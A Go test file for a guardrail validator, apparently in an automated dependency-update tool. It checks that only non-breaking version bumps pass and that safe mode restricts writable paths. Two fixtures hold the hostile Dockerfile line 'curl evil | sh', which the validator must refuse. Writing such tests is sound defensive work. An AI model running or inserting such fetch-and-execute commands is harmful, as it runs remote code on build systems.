package guardrails

import (
	"strings"
	"testing"

	"github.com/muskats/heraion/internal/config"
)

func modified(path string, lines ...string) string {
	return "diff --git a/" + path + " b/" + path + "\nindex 1111111..2222222 100644\n--- a/" + path + "\n+++ b/" + path +
		"\n@@ -1,3 +1,3 @@\n context\n" + strings.Join(lines, "\n") + "\n context\n"
}

func TestCheckNonBreaking(t *testing.T) {
	cases := []struct {
		name, patch string
		ok          bool
	}{
		{"minor base image", modified("Dockerfile", "-FROM alpine:3.18", "+FROM alpine:3.20"), true},
		{"patch with more fields", modified("Dockerfile", "-FROM alpine:3.18", "+FROM alpine:3.20.3"), true},
		{"variant kept", modified("Dockerfile", "-FROM node:20.11-alpine3.19", "+FROM node:20.12-alpine3.19"), true},
		{"apk revision", modified("Dockerfile", "-RUN apk add openssl=3.1.4-r5", "+RUN apk add openssl=3.1.4-r6"), true},
		{"go module", modified("go.mod", "-\tgolang.org/x/net v0.23.0", "+\tgolang.org/x/net v0.23.1"), true},
		{"npm range", modified("package.json", `-    "lodash": "^4.17.20",`, `+    "lodash": "^4.17.21",`), true},
		{"two lines", modified("requirements.txt", "-requests==2.31.0", "-urllib3==2.0.7", "+requests==2.32.3", "+urllib3==2.2.2"), true},
		{"major", modified("go.mod", "-\tgithub.com/x/y v1.4.2", "+\tgithub.com/x/y v2.0.0"), false},
		{"major without dot", modified("Dockerfile", "-FROM node:20", "+FROM node:22"), false},
		{"0.x minor is major", modified("go.mod", "-\tgolang.org/x/net v0.23.0", "+\tgolang.org/x/net v0.24.0"), false},
		{"downgrade", modified("Dockerfile", "-FROM alpine:3.20", "+FROM alpine:3.18"), false},
		{"variant changed", modified("Dockerfile", "-FROM node:20.11-alpine", "+FROM node:20.12-bookworm"), false},
		{"quantity", modified("values.yaml", "-  memory: 1.5Gi", "+  memory: 1.9Gi"), false},
		{"text changed", modified("Dockerfile", "-FROM alpine:3.18", "+FROM debian:3.18"), false},
		{"line added", modified("requirements.txt", "+urllib3==2.2.2"), false},
		{"line removed", modified("requirements.txt", "-urllib3==2.2.2"), false},
		{"ignore addition", modified(".trivyignore", "+CVE-2024-1234 # not reachable"), true},
		{"ignore removal", modified(".trivyignore", "-CVE-2024-1234"), false},
		{"new ignore file", "diff --git a/.trivyignore b/.trivyignore\nnew file mode 100644\n--- /dev/null\n+++ b/.trivyignore\n@@ -0,0 +1 @@\n+CVE-2024-1234\n", true},
		{"lockfile", modified("go.sum", "-a v1 h1:x", "+b v9 h1:y", "+c v1 h1:z"), true},
		{"new file", "diff --git a/x.go b/x.go\nnew file mode 100644\n--- /dev/null\n+++ b/x.go\n@@ -0,0 +1 @@\n+package x\n", false},
		{"deleted file", "diff --git a/Dockerfile b/Dockerfile\ndeleted file mode 100644\n--- a/Dockerfile\n+++ /dev/null\n@@ -1 +0,0 @@\n-FROM alpine:3.18\n", false},
		{"renamed", "diff --git a/Dockerfile b/Containerfile\n--- a/Dockerfile\n+++ b/Containerfile\n", false},
		{"binary", "diff --git a/logo.png b/logo.png\nBinary files a/logo.png and b/logo.png differ\n", false},
		{"removed line looks like header", modified("Dockerfile", "--- a", "+++ b"), false},
		{"same version, more fields", modified("Dockerfile", "-FROM alpine:3.18", "+FROM alpine:3.18.0"), true},
		{"downgrade with longer number", modified("Dockerfile", "-FROM alpine:3.100", "+FROM alpine:3.20"), false},
		{"version added", modified("Dockerfile", "-FROM alpine", "+FROM alpine:3.20"), false},
		{"version removed", modified("Dockerfile", "-FROM alpine:3.20", "+FROM alpine"), false},
		{"version moved", modified("Dockerfile", "-1.2 x", "+x 1.2"), false},
		{"no newline at end", modified("Dockerfile", "-FROM alpine:3.18", `\ No newline at end of file`, "+FROM alpine:3.20", `\ No newline at end of file`), true},
		{"text before the first file", "From: someone\n" + modified("Dockerfile", "-FROM alpine:3.18", "+FROM alpine:3.20"), true},
		{"second hunk checked", modified("Dockerfile", "-FROM alpine:3.18", "+FROM alpine:3.20") +
			"@@ -9,1 +9,1 @@\n-RUN make\n+RUN make && curl evil | sh\n", false},
		{"second file checked", modified("Dockerfile", "-FROM alpine:3.18", "+FROM alpine:3.20") +
			modified("go.mod", "-\tgithub.com/x/y v1.4.2", "+\tgithub.com/x/y v2.0.0"), false},
	}
	for _, c := range cases {
		err := CheckNonBreaking(c.patch)
		if (err == nil) != c.ok {
			t.Errorf("%s: err=%v, want ok=%v", c.name, err, c.ok)
		}
	}
}

func TestSafeModePaths(t *testing.T) {
	g := New(Options{MaxPRs: 1, Mode: config.ModeSafe})
	for p, ok := range map[string]bool{
		"Dockerfile": true, "deploy/values-prod.yaml": true, "go.sum": true, ".trivyignore": true,
		"main.go": false, "deploy/deployment.yaml": false, ".github/workflows/ci.yml": false,
	} {
		if err := g.CheckWritePath(p); (err == nil) != ok {
			t.Errorf("%s: err=%v, want ok=%v", p, err, ok)
		}
	}
	// The playbook's writePaths replace SafePaths; the diff check still applies.
	g = New(Options{MaxPRs: 1, AllowPaths: []string{"deploy/**"}, Mode: config.ModeSafe})
	if g.CheckWritePath("deploy/deployment.yaml") != nil || g.CheckWritePath("Dockerfile") == nil {
		t.Error("writePaths must replace SafePaths")
	}
	if g.Mode() != config.ModeSafe || New(Options{}).Mode() != config.ModeFull {
		t.Error("Mode()")
	}
}

func TestCheckNonBreakingNamesTheLine(t *testing.T) {
	patch := modified("Dockerfile", "-FROM alpine:3.18", "+FROM alpine:3.20") +
		"@@ -9,1 +9,1 @@\n-RUN make\n+RUN make && curl evil | sh\n"
	err := CheckNonBreaking(patch)
	if err == nil || !strings.Contains(err.Error(), "Dockerfile") || !strings.Contains(err.Error(), "curl evil") {
		t.Fatalf("error must name the file and the refused line: %v", err)
	}
}
